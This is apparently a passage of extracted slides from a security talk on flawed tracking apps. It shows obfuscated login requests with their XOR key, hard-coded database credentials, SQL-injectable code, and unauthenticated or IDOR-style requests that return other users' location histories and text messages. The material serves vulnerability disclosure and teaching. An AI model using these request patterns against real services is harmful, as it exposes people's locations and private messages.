tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A 
HTTP/1.1
GET /login/?
ssp=CFF1CxQoaQcoLWoRaQ%3D%3D%0A& 
eml=4hBWVqJg4D& 
mix=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A
HTTP/1.1
GET /login/?
psw=-ZI-WQe&
amr=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
rma=CFF1CxQoaQcoLWoRaQ%3D%3D%0A 
HTTP/1.1
GET /login/?
aaa=ZTZrO& 
mag=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A& 
df=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
data=5JFJzgYW_
HTTP/1.1
1.
2.
3.
4.
PI:EMAIL
secure123
57
Mitm + Bad Crypto + Obfuscation
GET /login/?
aaa=Bi9srqo&
nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A 
HTTP/1.1
GET /login/?
ssp=CFF1CxQoaQcoLWoRaQ%3D%3D%0A& 
eml=4hBWVqJg4D& 
mix=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A
HTTP/1.1
GET /login/?
psw=-ZI-WQe&
amr=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
rma=CFF1CxQoaQcoLWoRaQ%3D%3D%0A 
HTTP/1.1
GET /login/?
aaa=ZTZrO& 
mag=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A& 
df=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
data=5JFJzgYW_
HTTP/1.1
1.
2.
3.
4.
PI:EMAIL
secure123
58
Mitm + Bad Crypto + Obfuscation
GET /login/?
aaa=Bi9srqo&
nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A 
HTTP/1.1
GET /login/?
ssp=CFF1CxQoaQcoLWoRaQ%3D%3D%0A& 
eml=4hBWVqJg4D& 
mix=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A
HTTP/1.1
GET /login/?
psw=-ZI-WQe&
amr=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
rma=CFF1CxQoaQcoLWoRaQ%3D%3D%0A 
HTTP/1.1
GET /login/?
aaa=ZTZrO& 
mag=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A& 
df=CFF1CxQoaQcoLWoRaQ%3D%3D%0A&
data=5JFJzgYW_
HTTP/1.1
1.
2.
3.
4.
PI:EMAIL
secure123
59
Mitm + Bad Crypto + Obfuscation
'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'
60
Mitm + Bad Crypto + Obfuscation
DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ== 
Base64
'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'
PI:EMAIL
@
XOR
61
Mitm + Bad Crypto + Obfuscation
mag = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A 
amr = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A 
mix = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A 
nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A 
Base64
{nl, bhf, mag, bdt, qac, trn, amr, mix, nch}
Random()
“=“
+
+
'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'
PI:EMAIL
@
XOR
62
Mitm + Bad Crypto + Obfuscation
mag = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A 
CFF1CxQoaQcoLWoRaQ%3D%3D%0A = tnd
CFF1CxQoaQcoLWoRaQ%3D%3D%0A = ssp
CFF1CxQoaQcoLWoRaQ%3D%3D%0A = rma
CFF1CxQoaQcoLWoRaQ%3D%3D%0A = df
amr = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A 
mix = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A 
nch = DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A 
XOR
Base64
{nl, bhf, mag, bdt, qac, trn, amr, mix, nch}
Random()
“=“
+
+
{df,/ssp,/fgh,/ drt,/tnd,/rfb,/rma,/vwe,/hac}
secure123
********
Random()
“=“
+
+
'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'
PI:EMAIL
@
XOR
Base64
63
Mitm + Bad Crypto + Obfuscation
CFF1CxQoaQcoLWoRaQ==
DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ==
decode Base64
decode Base64
64
Mitm + Bad Crypto + Obfuscation
CFF1CxQoaQcoLWoRaQ==
DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ==
XOR
decode Base64
secure123
********
'k', 'c', '#', 'a', 'p', 'p', '#', 'k', 'e', 'y', '#'
PI:EMAIL
@
XOR
decode Base64
65
Mitm + Bad Crypto + Obfuscation
@
********
GET /login/?
aaa=Bi9srqo&
nch=DzttDRMbYQcAPmUfAGQZHDxOJRMbclZeKQ%3D%3D%0A&
tnd=CFF1CxQoaQcoLWoRaQ%3D%3D%0A 
data=5JFJzgYW_
HTTP/1.1
{usr, psw, uid, data, eml, pss, foo, clmn, count, nam, srv, answ, aaa }
Random()
“=“
+
+
GenerateRandomString()
66
67
Correct Secure Communication
§ Use https via TLS 1.2 or TLS 1.3
§ Valid server certificate 
68
Correct Secure Communication
§ Use https via TLS 1.2 or TLS 1.3
§ Valid server certificate 
§ Implementation in Android:
URL url = new URL("https://wikipedia.org");
URLConnection urlConnection = url.openConnection();
val url = URL("https://wikipedia.org")
val urlConnection: URLConnection = url.openConnection()
Java:
https://developer.android.com/training/articles/security-ssl#java
Kotlin:
69
“Authentication“
70
“Authentication“
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection(
);
try {
…
71
“Authentication“
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
…
72
“Authentication“
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
…
database address
username
73
“Authentication“
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
…
database address
username
password
74
“Authentication“
§ MySQL Database with following table scheme:
Field
Type
Null
Key
Default
Extra
nome
varchar(50)
NO
NULL
email
varchar(30)
NO
NULL
latitude
varchar(30)
NO
NULL
longitude
varchar(30)
NO
NULL
data
varchar(30)
NO
NULL
hora
varchar(30)
NO
NULL
codrenavam
varchar(30)
NO
NULL
placa
Varchar(30)
NO
PRI
NULL
75
“Authentication“
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
…
database address
username
password
All in all we had access to over 860.000 location data of different users, distributed over the whole world.
76
Is that all ?
77
Prepared Statement? WTF!
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
PreparedStatement prest = con.prepareStatement("insert rastreadorpessoal values(?)");
78
Prepared Statement? WTF!
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
PreparedStatement prest = con.prepareStatement("insert rastreadorpessoal values(?)");
prest.executeUpdate("insert into rastreadorpessoal
values('" + this.atributos.getNome() + "',
'" + this.atributos.getEmail() + "', 
'" + this.atributos.getLatitudeStr() + "',
'" + this.atributos.getLongitudeStr() + "',
'" + this.atributos.getDataBancoStr() + "', 
'" + this.atributos.getHoraBancoStr() + "',
'" + this.atributos.getRenavam() + "', 
'" + this.atributos.getPlaca() + "')");
prest.close();
con.close();
…
79
Prepared Statement? WTF!
…
Message message = new Message();
try {
Class.forName("com.mysql.jdbc.Driver");
Connection con = DriverManager.
getConnection("jdbc:mysql://mysql.r*****************r.mobi/r*************06", 
"r*************06", "t**********b");
try {
PreparedStatement prest = con.prepareStatement("insert rastreadorpessoal values(?)");
prest.executeUpdate("insert into rastreadorpessoal
values('" + this.atributos.getNome() + "',
'" + this.atributos.getEmail() + "', 
'" + this.atributos.getLatitudeStr() + "',
'" + this.atributos.getLongitudeStr() + "',
'" + this.atributos.getDataBancoStr() + "', 
'" + this.atributos.getHoraBancoStr() + "',
'" + this.atributos.getRenavam() + "', 
'" + this.atributos.getPlaca() + "')");
prest.close();
con.close();
…
80
Stupid !
81
Agenda
§ Motivation
§ Background Information
§ Client-Side Authorization
§ Client-Side and Communication Vulnerabilities
§ Server-Side Vulnerabilities
§ Responsible Disclosure Process
§ Summary
82
101
1. Authentication Process
2. Authorization Process
Observer
83
WTF-States of Server-Side Vulnerabilties
84
85
”That‘s a feature”
Not a Bug it‘s a Feature
§ Web service provides public access to user tracks, allow all by default
86
Not a Bug it‘s a Feature
§ Web service provides public access to user tracks, allow all by default
87
Not a Bug it‘s a Feature
https://www.greenalp.com/realtimetracker/index.php?viewuser=USERNAME
88
Demo Time !
89
Is that all ?
90
Public Webinterface
91
Authentication – What?
92
Part1: Who Needs Authentication?
http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2*****
***0&currentdate=07/12/2017
93
Part1: Who Needs Authentication?
http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2*****
***0&currentdate=07/12/2017
nothing new
94
Part1: Who Needs Authentication?
http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2*****
***0&currentdate=07/12/2017
your user id
nothing new
95
Part1: Who Needs Authentication?
http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2*****
***0&currentdate=07/12/2017
id of the person to track
nothing new
96
your user id
Part1: Who Needs Authentication?
http://***********g.azurewebsites.net/trackapplochistory.aspx?userid=********&childid=2*****
***0&currentdate=07/12/2017
id of the person to track
requested date
nothing new
97
your user id
Part1: Who Needs Authentication?
attacker
tracker back-end
Response for http://***********g.azurewebsites.net/...
07:47 PM*49.8715330929084,8.639047788304
07:52 PM*49.8731935027927,8.63498598738923
07:53 PM*49.871533247265,8.63904788614738
…
List of the complete track
98
Part1: Who Needs Authentication?
99
Part2: Who Needs Authentication?
§ Text message feature
§ How do we get the messages for a user?
100
Part2: Who Needs Authentication?
§ Text message feature
§ How do we get the messages for a user?
attacker
tracker back-end
POST /***************/api/get_sms HTTP/1.1
{"cnt":"100","user_id":"123456"}
result counter
101
Part2: Who Needs Authentication?
§ Text message feature
§ There is no authentication!
attacker
tracker back-end
List of text msg with:
•
user_id
•
timestamp
•
content
•
phone number
102
Part2: Who Needs Authentication?
§ What happens if user_id is empty?
attacker
tracker back-end
POST /***************/api/get_sms HTTP/1.1
{"cnt":"100","user_id":""}